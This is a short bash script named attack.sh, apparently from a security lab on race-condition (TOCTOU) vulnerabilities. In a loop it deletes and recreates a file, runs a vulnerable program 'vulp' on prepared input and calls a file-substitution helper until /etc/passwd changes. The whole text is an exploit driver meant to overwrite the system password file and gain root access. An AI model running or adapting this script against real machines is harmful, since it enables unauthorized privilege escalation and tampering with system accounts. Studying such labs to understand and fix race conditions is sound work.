


	#!/bin/bash
	# attack.sh
	CHECK_FILE="ls -l /etc/passwd"
	old=$($CHECK_FILE)
	new=$($CHECK_FILE)
	while [ "$old" == "$new" ] # Check if /etc/passwd is modified
	do
	 rm ./XYZ
	 true > ./XYZ
	 vulp < passwd_input &
	 ./substitute_file
	 new=$($CHECK_FILE)
	done
	echo "STOP... The passwd file has been changed"
